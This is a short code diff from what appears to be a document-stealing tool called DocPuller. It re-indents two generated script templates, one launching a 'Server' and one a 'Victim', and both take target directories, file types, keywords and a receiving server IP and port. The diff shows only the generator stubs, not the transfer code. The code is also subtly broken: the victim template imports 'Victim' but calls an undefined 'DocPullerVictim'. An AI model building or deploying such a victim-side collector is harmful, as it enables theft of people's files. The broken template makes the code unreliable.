@@ -28,33 +28,33 @@ if __name__ == '__main__':
             self.parms = f'{direcoties}, {file_type}, {keywords}, {date}, {server_ip}, {server_port}'
             self.SCRIPT1 = f"""
 
-            from DocPullerScripts.DocPullerFTP.server import Server
+from DocPullerScripts.DocPullerFTP.server import Server
 
-            def main():
+def main():
 
-                docPuller = Server({self.parms})
+    docPuller = Server({self.parms})
 
-                docPuller.main()
+    docPuller.main()
 
 
-            if __name__ == '__main__':
-                main();
+if __name__ == '__main__':
+    main();
 
                     """
 
             self.SCRIPT2 = f"""
 
-            from DocPullerScripts.DocPullerFTP.victim import Victim
+from DocPullerScripts.DocPullerFTP.victim import Victim
 
-            def main():
+def main():
 
-                docPuller = DocPullerVictim({self.parms})
+    docPuller = DocPullerVictim({self.parms})
 
-                docPuller.main()
+    docPuller.main()
 
 
-            if __name__ == '__main__':
-                main();
+if __name__ == '__main__':
+    main();
 
                     """
 
